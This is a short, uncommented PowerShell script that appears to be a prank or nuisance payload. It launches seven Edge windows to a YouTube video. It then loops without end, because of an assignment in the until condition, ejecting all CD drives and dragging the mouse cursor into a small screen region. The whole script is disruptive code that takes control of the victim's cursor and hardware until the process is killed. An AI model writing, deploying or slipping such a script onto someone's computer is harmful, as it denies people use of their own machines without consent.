$t =1 
foreach($i in 1..7){
 start-process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" https://www.youtube.com/watch?v=zfwJiG2F698#t=2m32s
 }
do{
$sh = New-Object -ComObject "Shell.Application"
$sh.Namespace(17).Items() | 
  Where-Object { $_.Type -eq "CD Drive" } | 
  foreach { $_.InvokeVerb("Eject") }
  $Pos = [System.Windows.Forms.Cursor]::Position
  $x = ($pos.X % 500) + 1
  $y = ($pos.Y % 500) + 1
  [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
 }until($t=0)
